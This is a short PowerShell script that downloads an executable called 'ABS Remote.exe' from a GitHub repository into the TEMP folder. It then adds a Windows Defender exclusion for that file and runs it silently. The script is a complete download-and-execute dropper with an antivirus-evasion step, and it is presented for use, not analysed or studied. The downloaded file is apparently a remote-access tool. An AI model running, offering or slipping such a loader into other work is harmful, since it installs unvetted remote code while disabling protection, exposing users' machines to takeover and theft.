# Define the URL and output file path
$url = "https://github.com/goatrbxdad/Remote/raw/main/ABS%20Remote.exe"
$output = "$env:TEMP\ABSRemote.exe"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $output

# Add exception to Windows Defender (if needed and trusted)
Add-MpPreference -ExclusionPath $output

# Run the executable
Start-Process -FilePath $output -ArgumentList "/silent" -NoNewWindow -Wait
